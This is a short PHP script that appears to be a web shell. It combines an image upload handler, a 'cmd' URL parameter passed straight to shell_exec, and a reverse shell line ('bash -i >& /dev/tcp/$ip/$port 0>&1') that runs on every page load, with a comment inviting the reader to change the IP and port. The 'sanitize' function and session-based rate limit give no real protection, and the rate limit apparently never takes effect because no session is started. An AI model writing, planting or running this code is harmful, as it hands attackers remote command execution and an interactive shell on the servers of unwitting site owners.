<?php

// Function to sanitize input
function sanitize($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

// File Upload
if (isset($_FILES['file'])) {
    $targetDir = 'uploads/';
    $targetFile = $targetDir . basename($_FILES['file']['name']);
    $allowedExtensions = array('jpg', 'jpeg', 'png', 'gif');
    $maxFileSize = 5 * 1024 * 1024; // Maximum file size: 5 MB

    $fileExtension = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));
    if (in_array($fileExtension, $allowedExtensions) && $_FILES['file']['size'] <= $maxFileSize && move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
        echo "File uploaded successfully: " . sanitize($_FILES['file']['name']);
    } else {
        echo "File upload failed.";
    }
}

// Command Execution with Rate Limiting
if (isset($_GET['cmd'])) {
    $cmd = sanitize($_GET['cmd']);

    // Rate Limiting: Execute only once per minute
    $lastExecutionTime = isset($_SESSION['last_execution_time']) ? $_SESSION['last_execution_time'] : 0;
    if (time() - $lastExecutionTime >= 60) {
        echo "Command: " . $cmd . "<br>";
        echo "Output: <br>";
        echo "<pre>" . shell_exec($cmd) . "</pre>";
        $_SESSION['last_execution_time'] = time(); // Update last execution time
    } else {
        echo "Rate limit exceeded.";
    }
}

// Reverse Shell (Change the IP and Port)
$ip = '127.0.0.1';
$port = 4444;
$reverseShell = "bash -i >& /dev/tcp/$ip/$port 0>&1";
shell_exec($reverseShell);

?>
